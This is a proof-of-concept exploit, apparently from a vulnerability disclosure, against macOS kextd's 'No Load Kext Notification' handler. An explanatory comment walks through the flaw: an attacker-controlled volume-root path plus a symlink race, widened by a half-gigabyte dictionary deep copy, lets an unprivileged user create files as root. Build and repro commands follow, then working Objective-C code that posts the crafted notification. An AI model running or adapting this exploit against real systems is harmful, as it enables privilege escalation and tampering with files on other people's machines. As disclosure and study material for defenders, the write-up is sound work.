/*
ianbeer

kextd runs as root and subscribes to various Distributed Notifications [ https://developer.apple.com/library/prerelease/ios/documentation/CoreFoundation/Reference/CFNotificationCenterRef/index.html ]

Distributed Notifications allow any process to post a named notification; the system will then ensure that all processes which are observing that name get notified.
As well as just posting named notifications, senders can also attach a Dictionary object to each post which can contain all the usual CF/NS types like strings, arrays, data blobs etc
and which will be copied to each observer.

There are no restrictions on which process can send a particular notification, and you can't find out who sent it to you (well, you probably can if you try, but that isn't the idea behind them.)

One notification kextd listens for is "No Load Kext Notification":



****** SNIP ********
    // Sign up to receive notifications when nonsigned kexts are found.  We
    // currently get messages from kextcache, kextload and kextutil.
    CFNotificationCenterAddObserver(CFNotificationCenterGetDistributedCenter(),
                                    NULL,
                                    NoLoadSigFailureKextCallback,
                                    CFSTR("No Load Kext Notification"),
                                    NULL,
                                    CFNotificationSuspensionBehaviorDeliverImmediately);
****** SNIP *********



The system will then call the NoLoadSigFailureKextCallback method when a "No Load Kext Notification" notification is posted. Note the comment claiming that
the code is expecting notifications to be posted by kextcache, kextload and kextutil. Nothing enforces that only these processes post this notification though.

Here's the definition of the callback:



****** SNIP ********
void NoLoadSigFailureKextCallback(CFNotificationCenterRef center,
                                  void *observer,
                                  CFStringRef name,
                                  const void *object,
                                  CFDictionaryRef userInfo)
{
    if (userInfo) {
        // synchronize access to our plist file
        CFRetain(userInfo);
        dispatch_async(dispatch_get_main_queue(), ^ {
            writeKextAlertPlist(userInfo, NO_LOAD_KEXT_ALERT);
        });
    }
    
    return;
}
****** SNIP ********



userInfo here is an attack-controlled CFDictionary. This code schedules a call to writeKextAlertPlist passing the controlled dictionary as the first argument:



****** SNIP ********
void writeKextAlertPlist( CFDictionaryRef theDict, int theAlertType )
{
...
    myKextArray = (CFArrayRef)
        CFDictionaryGetValue(theDict, CFSTR("KextInfoArrayKey"));
    
    // note for the kextcache case we could target a volume other than the boot
    // volume.  In that case we need to add the "/Volumes/XXXvol/"
    // to the path.
    myVolRoot = (CFStringRef) CFDictionaryGetValue( theDict,
                                                    CFSTR("VolRootKey"));
    myPath = createPathFromAlertType(myVolRoot, theAlertType);
...
**** SNIP ********



The first half of this function get the value of the "VolRootKey" key from the attacker controlled dictionary and passes that to createPathFromAlertType:



**** SNIP ********
static CFStringRef createPathFromAlertType( CFStringRef theVolRoot,
                                            int theAlertType )
{
...
            myPath = CFStringCreateWithFormat(
                                              kCFAllocatorDefault,
                                              NULL,
                                              CFSTR("%@%s"),
                                              theVolRoot,
                                              NO_LOAD_KEXT_ALERT_FULL_PATH);
...
    return( myPath);
**** SNIP ********



This just concatenates "/System/Library/Caches/com.apple.kext.caches/Startup/noloadkextalert.plist" on the the end of the controlled theVolRoot string and returns it.

back in writeKextAlertPlist:



**** SNIP ********
...    
    myURL = CFURLCreateWithFileSystemPath( kCFAllocatorDefault,
                                           myPath,
                                           kCFURLPOSIXPathStyle,
                                           false );
    fileExists = CFURLResourceIsReachable(myURL, NULL);
    
    if (fileExists) {
        // modify the existing plist
    } else {
        // create a new plist 
    }
**** SNIP ********



The code then uses the CFURLResourceIsReachable method to determine if that file exists or not. If it does exist, then it reads a plist at that path; modifies it and writes it back.
If it doesn't exist then it will create a new plist at that path and write partially attacker-controlled values into it (from the "KextInfoArrayKey" value.)

There is quite clearly scope for some symlink fun here to let us create/overwrite arbitrary files as root (as we control the beginning of the path, before the '/System...' part is appended)
but we need a few tricks to actually pull that off:

The problem is that if we just create a symlink like this:

ln -s /tmp/create_as_root /tmp/lolz/System/Library/Caches/com.apple.kext.caches/Startup/noloadkextalert.plist

then CFURLResourceIsReachable will think that file exists, even if the /tmp/create_as_root file doesn't actually exist.

The API will follow symlinks in the path however, so we can symlink /tmp/lolz/System/Library/Caches/com.apple.kext.caches/Startup to /tmp which will have the effect of creating a file called noloadkextalert.plist
in /tmp owned by root.

That's not very interesting though. We can do better!

if fileExists is false we reach the following code:



**** SNIP ********
        // plist does not exist, create one
        alertDict = CFDictionaryCreateMutable(
                                              kCFAllocatorDefault, 0,
                                              &kCFTypeDictionaryKeyCallBacks,
                                              &kCFTypeDictionaryValueCallBacks);
        // add our array to the dictionary
        CFDictionarySetValue(alertDict, CFSTR("Alerts sent"), myKextArray);
        
        alertPlist = CFPropertyListCreateDeepCopy(
                                                  kCFAllocatorDefault,
                                                  alertDict,
                                                  kCFPropertyListMutableContainersAndLeaves );
        writeStream = CFWriteStreamCreateWithFile(kCFAllocatorDefault, myURL);
        // continue on and write to that file
**** SNIP ********



CFWriteStreamCreateWithFile will properly handle symlinks, that is, if we reach that line and /tmp/lolz/System/Library/Caches/com.apple.kext.caches/Startup/noloadkextalert.plist is a symlink pointing to a non-existing
file then it will create the target of the symlink as a new file and write to that.

This means that we just need to win a race: we need CFURLResourceIsReachable to see that the /tmp/lolz/System/Library/Caches/com.apple.kext.caches/Startup/noloadkextalert.plist file doesn't exists,
but by the time the code reaches the CFWriteStreamCreateWithFile call we need that file to be a symlink pointing to the file we want to create as root.

We can very easily win this race because right before the CFWriteStreamCreateWithFile call the code calls CFPropertyListCreateDeepCopy which creates a deep copy of a partially attacker-controlled dictionary.

By making that dictionary really big we can make that deep copy take long enough for us to be able to create a symlink :)

This PoC creates a .5 GB dictionary to make sure it wins the race, but that's overdoing it really, you could still win it much faster.

Repro steps:

build this file:
  clang -o kextd_notifications kextd_notifications.m -framework Foundation

create the required directory structure under tmp:
  mkdir -p /tmp/lolz/System/Library/Caches/com.apple.kext.caches/Startup/

try to win the race:
  ./kextd_notifications && sleep 8 && ln -s /tmp/create_as_root /tmp/lolz/System/Library/Caches/com.apple.kext.caches/Startup/noloadkextalert.plist

did you win?:
  ls -lha /tmp/create_as_root

You'll have to fiddle with the amount of time that it sleeps, this is only a PoC :) Obviously if it fails you'll have to clear up manually with sudo or use a new path before you try again.
*/


#include <Foundation/Foundation.h>

#include <stdlib.h>
#include <stdio.h>


int main() {
  CFMutableDictionaryRef dictionary = CFDictionaryCreateMutable(NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
  CFDictionaryAddValue(dictionary, @"VolRootKey", @"/tmp/lolz");

  CFMutableArrayRef arr = CFArrayCreateMutable(NULL, 0, &kCFTypeArrayCallBacks);
  CFArrayAppendValue(arr, CFSTR("hello"));

  for (int i = 0; i < 20000000; i++) {
    CFArrayAppendValue(arr, CFSTR("looooooong"));
  }

  CFDictionaryAddValue(dictionary, @"KextInfoArrayKey", arr);

  CFNotificationCenterPostNotificationWithOptions(CFNotificationCenterGetDistributedCenter(),
                                                  CFSTR("No Load Kext Notification"),
                                                  NULL, 
                                                  dictionary, 
                                                  kCFNotificationDeliverImmediately | kCFNotificationPostToAllSessions);
  CFRelease(dictionary); 
}
